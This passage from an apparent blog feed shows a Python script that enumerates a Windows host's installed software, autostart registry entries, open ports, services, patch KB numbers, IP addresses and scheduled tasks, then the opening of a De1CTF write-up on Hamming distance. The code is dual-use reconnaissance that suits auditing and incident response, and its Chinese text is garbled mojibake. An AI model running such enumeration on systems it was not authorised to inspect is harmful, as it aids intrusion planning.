class="comment"># print(&quot;Path: &#123;&#125;&quot;.format(value))</span></span><br><span class="line">            <span class="comment"># print(&quot;-&quot;*50)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># print(&quot;&#123;&#125; is empty.\n&quot;.format(title))</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">list_registry_subkeys</span>(<span class="params">hive, subkey</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> winreg.OpenKey(hive, subkey) <span class="keyword">as</span> key:</span><br><span class="line">            subkeys_count, _, _ = winreg.QueryInfoKey(key)</span><br><span class="line">            subkeys = [winreg.EnumKey(key, i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(subkeys_count)]</span><br><span class="line">            <span class="keyword">return</span> subkeys</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># print(&quot;[-] Error: &#123;&#125;&quot;.format(e))</span></span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_registry_value</span>(<span class="params">hive, subkey, value_name</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> winreg.OpenKey(hive, subkey) <span class="keyword">as</span> key:</span><br><span class="line">            value, _ = winreg.QueryValueEx(key, value_name)</span><br><span class="line">            <span class="keyword">return</span> value</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># print(&quot;[-] Error: &#123;&#125;&quot;.format(e))</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getInstallAppInfo</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;========================= å®‰è£…åº”ç”¨ =========================&quot;</span>)</span><br><span class="line">    <span class="comment"># åˆ—å‡º HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall ä¸‹çš„å­é¡¹åŠå…¶ DisplayName å€¼</span></span><br><span class="line">    hive1 = winreg.HKEY_LOCAL_MACHINE</span><br><span class="line">    subkey = <span class="string">r&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall&quot;</span></span><br><span class="line">    subkeys1 = list_registry_subkeys(hive1, subkey)</span><br><span class="line"></span><br><span class="line">    hive2 = winreg.HKEY_CURRENT_USER</span><br><span class="line">    subkeys2 = list_registry_subkeys(hive2, subkey)</span><br><span class="line">    <span class="keyword">if</span> subkeys1:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] HKLM:&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ‰“å°ç»“æœ</span></span><br><span class="line">    <span class="keyword">for</span> subkey_name <span class="keyword">in</span> subkeys1:</span><br><span class="line">        subkey_path = <span class="string">r&quot;&#123;&#125;\&#123;&#125;&quot;</span>.<span class="built_in">format</span>(subkey, subkey_name)</span><br><span class="line">        display_name = get_registry_value(hive1, subkey_path, <span class="string">&quot;DisplayName&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> display_name:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(display_name))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> subkeys2:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] HKCU:&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> subkey_name <span class="keyword">in</span> subkeys2:</span><br><span class="line">        subkey_path = <span class="string">r&quot;&#123;&#125;\&#123;&#125;&quot;</span>.<span class="built_in">format</span>(subkey, subkey_name)</span><br><span class="line">        display_name = get_registry_value(hive2, subkey_path, <span class="string">&quot;DisplayName&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> display_name:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(display_name))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getAutoRunInfo</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;========================= è‡ªå¯åŠ¨é¡¹ =========================&quot;</span>)</span><br><span class="line">    print_startup_items(startup_items_current_user_run, <span class="string">&quot;HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&quot;</span>)</span><br><span class="line">    print_startup_items(startup_items_current_user_runonce, <span class="string">&quot;HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce&quot;</span>)</span><br><span class="line">    print_startup_items(startup_items_local_machine_run, <span class="string">&quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&quot;</span>)</span><br><span class="line">    print_startup_items(startup_items_local_machine_runonce, <span class="string">&quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getPortInfo</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;========================= å¼€æ”¾ç«¯å£ =========================&quot;</span>)</span><br><span class="line">    services_TCP_found = []  <span class="comment"># ä¿å­˜è¯†åˆ«å‡ºçš„ç«¯å£æœåŠ¡ä¿¡æ¯</span></span><br><span class="line">    services_TCP_unfound = []</span><br><span class="line">    services_UDP_found = []</span><br><span class="line">    services_UDP_unfound = []</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = subprocess.Popen([<span class="string">&quot;netstat&quot;</span>, <span class="string">&quot;-ano&quot;</span>], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=<span class="literal">True</span>)</span><br><span class="line">        out, err = result.communicate()</span><br><span class="line">        netstat_output = out.decode(<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line">        <span class="comment"># print(netstat_output)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…å¹¶æå–ä¿¡æ¯</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> netstat_output.splitlines():</span><br><span class="line">            <span class="keyword">match</span> = re.<span class="keyword">match</span>(<span class="string">r&#x27;\s*TCP\s+(\S+)\s+(\S+)\s+(\S+)\s+(\d+)&#x27;</span>, line)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                local_address, _, state, pid = <span class="keyword">match</span>.groups()</span><br><span class="line"></span><br><span class="line">                <span class="comment"># åªè¾“å‡º LISTENING çŠ¶æ€çš„ä¿¡æ¯ï¼Œå¹¶ä¸”åªæ˜¾ç¤ºæœ¬åœ°åœ°å€ã€çŠ¶æ€å’Œ PID</span></span><br><span class="line">                <span class="keyword">if</span> state <span class="keyword">in</span> [<span class="string">&quot;LISTENING&quot;</span>, <span class="string">&quot;ESTABLISHED&quot;</span>]:</span><br><span class="line">                    <span class="comment"># ä» local_address ä¸­æå– IP åœ°å€å’Œç«¯å£</span></span><br><span class="line">                    ip_port_match = re.<span class="keyword">match</span>(<span class="string">r&#x27;(\S+):(\d+)&#x27;</span>, local_address)</span><br><span class="line">                    <span class="keyword">if</span> ip_port_match:</span><br><span class="line">                        ip, port = ip_port_match.groups()</span><br><span class="line">                        <span class="comment"># å°è¯•ä»å­—å…¸ä¸­è·å–æœåŠ¡ä¿¡æ¯ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°åˆ™è¾“å‡º &quot;Unknown Service&quot;</span></span><br><span class="line">                        service = service_port_mapping.get(<span class="built_in">int</span>(port), <span class="string">&quot;Unknown Service&quot;</span>)</span><br><span class="line">                        <span class="comment"># è¾“å‡º IPåœ°å€ã€ç«¯å£ã€çŠ¶æ€å’Œ PIDã€æœåŠ¡</span></span><br><span class="line">                        <span class="keyword">if</span> service != <span class="string">&quot;Unknown Service&quot;</span>:</span><br><span class="line">                            services_TCP_found.append(&#123;<span class="string">&quot;port&quot;</span>: port, <span class="string">&quot;service&quot;</span>: service&#125;)</span><br><span class="line">                            <span class="comment"># services_TCP_found.append(&#123;&quot;port&quot;: port, &quot;pid&quot;:pid,&quot;service&quot;: service&#125;)</span></span><br><span class="line"></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            services_TCP_unfound.append(&#123;<span class="string">&quot;port&quot;</span>: port, <span class="string">&quot;service&quot;</span>: service&#125;)</span><br><span class="line">                            <span class="comment"># services_TCP_unfound.append(&#123;&quot;port&quot;: port, &quot;pid&quot;:pid, &quot;service&quot;: service&#125;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment"># æœ¬åœ°è¿æ¥IP ç«¯å£å»é‡  å¹¶ç”¨portè¿›è¡Œæ’åº</span></span><br><span class="line">        services_TCP_found = [<span class="built_in">dict</span>(t) <span class="keyword">for</span> t <span class="keyword">in</span> &#123;<span class="built_in">tuple</span>(d.items()) <span class="keyword">for</span> d <span class="keyword">in</span> services_TCP_found&#125;]</span><br><span class="line">        services_TCP_found = <span class="built_in">sorted</span>(services_TCP_found, key=<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x[<span class="string">&#x27;port&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">        services_TCP_unfound = [<span class="built_in">dict</span>(t) <span class="keyword">for</span> t <span class="keyword">in</span> &#123;<span class="built_in">tuple</span>(d.items()) <span class="keyword">for</span> d <span class="keyword">in</span> services_TCP_unfound&#125;]</span><br><span class="line">        services_TCP_unfound = <span class="built_in">sorted</span>(services_TCP_unfound, key=<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x[<span class="string">&#x27;port&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] å…±åŒ¹é…åˆ° &#123;&#125; ä¸ªå·²çŸ¥TCPç«¯å£æœåŠ¡&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(services_TCP_found)))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] å…±åŒ¹é…åˆ° &#123;&#125; ä¸ªæœªçŸ¥TCPç«¯å£æœåŠ¡&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(services_TCP_unfound)))</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] è¯†åˆ«å‡ºçš„TCPç«¯å£æœåŠ¡:&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> services_TCP_found:</span><br><span class="line">            <span class="keyword">for</span> service_info <span class="keyword">in</span> services_TCP_found:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;TCP\t\t&#123;&#125;\t\t&#123;&#125;&quot;</span>.<span class="built_in">format</span>(service_info[<span class="string">&#x27;port&#x27;</span>] ,service_info[<span class="string">&#x27;service&#x27;</span>]))</span><br><span class="line">                <span class="comment"># print(&quot;TCP\t\t&#123;&#125;\t\t&#123;&#125;/&#123;&#125;&quot;.format(service_info[&#x27;port&#x27;], service_info[&#x27;pid&#x27;],service_info[&#x27;service&#x27;]))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] æœªè¯†åˆ«å‡ºçš„TCPç«¯å£æœåŠ¡:&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> services_TCP_unfound:</span><br><span class="line">            <span class="keyword">for</span> service_info <span class="keyword">in</span> services_TCP_unfound:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;TCP\t\t&#123;&#125;\t\t&#123;&#125;&quot;</span>.<span class="built_in">format</span>(service_info[<span class="string">&#x27;port&#x27;</span>], service_info[<span class="string">&#x27;service&#x27;</span>]))</span><br><span class="line">                <span class="comment"># print(&quot;TCP\t\t&#123;&#125;\t\t&#123;&#125;/&#123;&#125;&quot;.format(service_info[&#x27;port&#x27;], service_info[&#x27;pid&#x27;],service_info[&#x27;service&#x27;]))</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># å¦‚æœæœªæ‰¾åˆ°ç›¸å…³ä¿¡æ¯ï¼Œåˆ™è¾“å‡ºä¸€æ¡æ¶ˆæ¯</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">any</span>(re.<span class="keyword">match</span>(<span class="string">r&#x27;\s*TCP\s+(\S+)\s+(\S+)\s+(\S+)\s+(\d+)&#x27;</span>, line) <span class="keyword">for</span> line <span class="keyword">in</span> netstat_output.splitlines()):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] æœªæ‰¾åˆ°ç›¸å…³TCPç«¯å£æœåŠ¡!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> netstat_output.splitlines():</span><br><span class="line">            UDPpattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;UDP\s+(?P&lt;ip_address&gt;[\w\.\[\]:]+):(?P&lt;port&gt;\d+)\s+\*:\*\s+(?P&lt;pid&gt;\d+)&#x27;</span>)</span><br><span class="line">            UDPmatches = UDPpattern.findall(line)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> UDPmatch <span class="keyword">in</span> UDPmatches:</span><br><span class="line">                service = service_port_mapping.get(<span class="built_in">int</span>(UDPmatch[<span class="number">1</span>]), <span class="string">&quot;Unknown Service&quot;</span>)</span><br><span class="line">                <span class="comment"># print(&quot;UDP:&quot;, UDPmatch[0], &quot;Port:&quot;, UDPmatch[1], &quot;PID:&quot;, UDPmatch[2])</span></span><br><span class="line">                <span class="keyword">if</span> service != <span class="string">&quot;Unknown Service&quot;</span>:</span><br><span class="line">                    services_UDP_found.append(&#123;<span class="string">&quot;port&quot;</span>: UDPmatch[<span class="number">1</span>], <span class="string">&quot;service&quot;</span>: service&#125;)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    services_UDP_unfound.append(&#123;<span class="string">&quot;port&quot;</span>: UDPmatch[<span class="number">1</span>], <span class="string">&quot;service&quot;</span>: service&#125;)</span><br><span class="line"></span><br><span class="line">        services_UDP_found = [<span class="built_in">dict</span>(t) <span class="keyword">for</span> t <span class="keyword">in</span> &#123;<span class="built_in">tuple</span>(d.items()) <span class="keyword">for</span> d <span class="keyword">in</span> services_UDP_found&#125;]</span><br><span class="line">        services_UDP_found = <span class="built_in">sorted</span>(services_UDP_found, key=<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x[<span class="string">&#x27;port&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">        services_UDP_unfound = [<span class="built_in">dict</span>(t) <span class="keyword">for</span> t <span class="keyword">in</span> &#123;<span class="built_in">tuple</span>(d.items()) <span class="keyword">for</span> d <span class="keyword">in</span> services_UDP_unfound&#125;]</span><br><span class="line">        services_UDP_unfound = <span class="built_in">sorted</span>(services_UDP_unfound, key=<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x[<span class="string">&#x27;port&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] å…±åŒ¹é…åˆ° &#123;&#125; ä¸ªå·²çŸ¥UDPç«¯å£æœåŠ¡&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(services_UDP_found)))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] å…±åŒ¹é…åˆ° &#123;&#125; ä¸ªæœªçŸ¥UDPç«¯å£æœåŠ¡&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(services_UDP_unfound)))</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] è¯†åˆ«å‡ºçš„UDPç«¯å£æœåŠ¡:&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> services_UDP_found:</span><br><span class="line">            <span class="keyword">for</span> service_info <span class="keyword">in</span> services_UDP_found:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;UDP\t\t&#123;&#125;\t\t&#123;&#125;&quot;</span>.<span class="built_in">format</span>(service_info[<span class="string">&#x27;port&#x27;</span>], service_info[<span class="string">&#x27;service&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] æœªè¯†åˆ«å‡ºçš„UDPç«¯å£æœåŠ¡:&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> services_UDP_unfound:</span><br><span class="line">            <span class="keyword">for</span> service_info <span class="keyword">in</span> services_UDP_unfound:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;UDP\t\t&#123;&#125;\t\t&#123;&#125;&quot;</span>.<span class="built_in">format</span>(service_info[<span class="string">&#x27;port&#x27;</span>], service_info[<span class="string">&#x27;service&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> subprocess.CalledProcessError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] é”™è¯¯: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getServiceInfo</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;========================= è¿è¡ŒæœåŠ¡ =========================&#x27;</span>)</span><br><span class="line">        result = subprocess.Popen(<span class="string">&#x27;net start | find /v &quot;å·²ç»å¯åŠ¨ä»¥ä¸‹ Windows æœåŠ¡&quot; | find /v &quot;å‘½ä»¤æˆåŠŸå®Œæˆ&quot;&#x27;</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=<span class="literal">True</span>)</span><br><span class="line">        out, err = result.communicate()</span><br><span class="line">        netstat_output = out.decode(<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line">        <span class="comment"># å»ç©ºè¡Œ</span></span><br><span class="line">        netstat_output = <span class="string">&quot;\n&quot;</span>.join(line <span class="keyword">for</span> line <span class="keyword">in</span> netstat_output.splitlines() <span class="keyword">if</span> line.strip())</span><br><span class="line">        <span class="comment"># print(netstat_output)</span></span><br><span class="line">        <span class="comment"># å»æ‰æ¯è¡Œå‰é¢çš„å‡ ä¸ªç©ºæ ¼</span></span><br><span class="line">        cleaned_text = <span class="string">&quot;\n&quot;</span>.join(line.lstrip() <span class="keyword">for</span> line <span class="keyword">in</span> netstat_output.splitlines())</span><br><span class="line">        <span class="built_in">print</span>(cleaned_text)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> subprocess.CalledProcessError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] é”™è¯¯: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSystemInfo</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;========================= ç³»ç»Ÿä¿¡æ¯ =========================&quot;</span>)</span><br><span class="line">    cmd_command1 = <span class="string">r&#x27;systeminfo | findstr /i /c:&quot;ä¸»æœºå&quot; /c:&quot;OS åç§°&quot; /c:&quot;OS ç‰ˆæœ¬&quot; | find /v &quot;BIOS ç‰ˆæœ¬&quot;&#x27;</span></span><br><span class="line">    process = subprocess.Popen(cmd_command1, shell=<span class="literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line">    stdout1, stderr1 = process.communicate()</span><br><span class="line">    stdout1 = stdout1.decode(<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line">    stdout1 = <span class="string">&quot;\n&quot;</span>.join(line <span class="keyword">for</span> line <span class="keyword">in</span> stdout1.splitlines() <span class="keyword">if</span> line.strip())</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(stdout1)</span><br><span class="line">    <span class="keyword">if</span> stderr1:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] error:&quot;</span>, stderr1.decode(<span class="string">&#x27;gbk&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    cmd_command2 = <span class="string">r&#x27;cmd /c ipconfig | findstr /i &quot;IPv4 åœ°å€ IP Address&quot; | findstr /i /v &quot;IPv6&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line">    process = subprocess.Popen(cmd_command2, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    stdout2, stderr2 = process.communicate()</span><br><span class="line">    <span class="keyword">if</span> stderr2:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] error:&quot;</span>, stderr2.decode(<span class="string">&#x27;gbk&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…IPv4åœ°å€</span></span><br><span class="line">    ipv4_pattern1 = re.<span class="built_in">compile</span>(<span class="string">r&#x27;IPv4 åœ°å€[^:]+:\s*([\d.]+)&#x27;</span>, re.IGNORECASE)</span><br><span class="line">    ipv4_pattern2 = re.<span class="built_in">compile</span>(<span class="string">r&#x27;IP Address\. .+? : (\d+\.\d+\.\d+\.\d+)&#x27;</span>, re.IGNORECASE)</span><br><span class="line"></span><br><span class="line">    match1 = ipv4_pattern1.search(stdout2.decode(<span class="string">&#x27;gbk&#x27;</span>, errors=<span class="string">&#x27;replace&#x27;</span>))</span><br><span class="line">    match2 = ipv4_pattern2.search(stdout2.decode(<span class="string">&#x27;gbk&#x27;</span>, errors=<span class="string">&#x27;replace&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> match1:</span><br><span class="line">        ipv4_address = match1.group(<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;IPv4åœ°å€:\t &quot;</span>, ipv4_address)</span><br><span class="line">    <span class="keyword">elif</span> match2:</span><br><span class="line">        ipv4_address = match2.group(<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;IPv4åœ°å€:\t &quot;</span>, ipv4_address)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] æœªæ‰¾åˆ°IPv4åœ°å€&quot;</span>)</span><br><span class="line"></span><br><span class="line">    cmd_command3 = <span class="string">&#x27;systeminfo&#x27;</span></span><br><span class="line">    process = subprocess.Popen(cmd_command3, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=<span class="literal">True</span>)</span><br><span class="line">    stdout3, stderr3 = process.communicate()</span><br><span class="line">    <span class="keyword">if</span> stderr3:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] error:&quot;</span>, stderr3.decode(<span class="string">&#x27;gbk&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    kb_pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;KB\d&#123;7&#125;&#x27;</span>)</span><br><span class="line">    q_pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;Q\d&#123;6&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    matches_kb = kb_pattern.findall(stdout3.decode(<span class="string">&#x27;gbk&#x27;</span>))</span><br><span class="line">    matches_q = q_pattern.findall(stdout3.decode(<span class="string">&#x27;gbk&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> matches_kb:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;å·²å®‰è£…&quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(matches_kb)) + <span class="string">&quot;ä¸ªè¡¥ä¸:\t&quot;</span>, matches_kb)</span><br><span class="line">    <span class="keyword">if</span> matches_q:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;å·²å®‰è£…&quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(matches_q)) + <span class="string">&quot;ä¸ªè¡¥ä¸:\t&quot;</span>, matches_q)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è·å–è¿”å›ç </span></span><br><span class="line">    return_code = process.returncode</span><br><span class="line">    <span class="keyword">if</span> return_code != <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Return Code:&quot;</span>, return_code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getScheduleTaskInfo</span>():</span><br><span class="line">    <span class="comment"># æŒ‡å®šç›®å½•è·¯å¾„</span></span><br><span class="line">    directory = <span class="string">r&#x27;C:\Windows\System32\Tasks&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;========================= è®¡åˆ’ä»»åŠ¡ =========================&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># è·å–ç›®å½•ä¸‹çš„æ–‡ä»¶åˆ—è¡¨</span></span><br><span class="line">        file_list = os.listdir(directory)</span><br><span class="line">        <span class="keyword">if</span> file_list:</span><br><span class="line">            <span class="comment"># åˆå§‹åŒ–ä¸€ä¸ªç©ºæ•°ç»„ç”¨äºå­˜å‚¨æ–‡ä»¶å</span></span><br><span class="line">            files_array = []</span><br><span class="line">            <span class="comment"># éå†ç›®å½•ä¸‹çš„å†…å®¹</span></span><br><span class="line">            <span class="keyword">for</span> filename <span class="keyword">in</span> file_list:</span><br><span class="line">                file_path = os.path.join(directory, filename)</span><br><span class="line">                <span class="comment"># æ£€æŸ¥å½“å‰é¡¹ç›®æ˜¯å¦ä¸ºæ–‡ä»¶</span></span><br><span class="line">                <span class="keyword">if</span> os.path.isfile(file_path):</span><br><span class="line">                    <span class="comment"># å¦‚æœæ˜¯æ–‡ä»¶ï¼Œåˆ™å°†å…¶åç§°æ·»åŠ åˆ°æ•°ç»„ä¸­</span></span><br><span class="line">                    files_array.append(filename)</span><br><span class="line">            <span class="comment"># æ‰“å°å­˜å‚¨åœ¨æ•°ç»„ä¸­çš„æ–‡ä»¶å</span></span><br><span class="line">            <span class="keyword">if</span> files_array:</span><br><span class="line">                <span class="keyword">for</span> file <span class="keyword">in</span> files_array:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(file))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-] æœªæ‰¾åˆ°è®¡åˆ’ä»»åŠ¡!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="comment"># å¤„ç†æ‰¾ä¸åˆ°ç›®å½•çš„æƒ…å†µ</span></span><br><span class="line">        <span class="comment"># print(&quot;[-] ç›®å½• &#x27;&#123;&#125;&#x27; ä¸å­˜åœ¨&quot;.format(directory))</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] æœªæ‰¾åˆ°è®¡åˆ’ä»»åŠ¡!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getOSRelease</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] å¼€å§‹å¯¹æœ¬æœºè¿›è¡Œä¿¡æ¯æ”¶é›†,è¯·ç¨ç­‰ç‰‡åˆ»......&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] æ£€æµ‹åˆ°å½“å‰ä¸»æœºç³»ç»Ÿä¸º&#x27;</span>,platform.system() +<span class="string">&quot; &quot;</span>+platform.release())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    getOSRelease()</span><br><span class="line">    getSystemInfo()</span><br><span class="line">    getAutoRunInfo()</span><br><span class="line">    getPortInfo()</span><br><span class="line">    getInstallAppInfo()</span><br><span class="line">    getServiceInfo()</span><br><span class="line">    getScheduleTaskInfo()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



]]></content>
  </entry>
  <entry>
    <title>2019 De1CTF XORZ</title>
    <url>/posts/8eb1c662/</url>
    <content><![CDATA[<h3 id="æ±‰æ˜è·ç¦»ã€Hamming-distanceã€‘"><a href="#æ±‰æ˜è·ç¦»ã€Hamming-distanceã€‘" class="headerlink" title="æ±‰æ˜è·ç¦»ã€Hamming distanceã€‘"></a>æ±‰æ˜è·ç¦»ã€Hamming distanceã€‘</h3><p>åœ¨ä¿¡æ¯è®ºä¸­ï¼Œä¸¤ä¸ªç­‰é•¿å­—ç¬¦ä¸²ä¹‹é—´çš„æ±‰æ˜è·ç¦» æ˜¯ä¸¤ä¸ªå­—ç¬¦ä¸²å¯¹åº”ä½ç½®çš„ä¸åŒå­—ç¬¦çš„ä¸ªæ•°ã€‚</p>
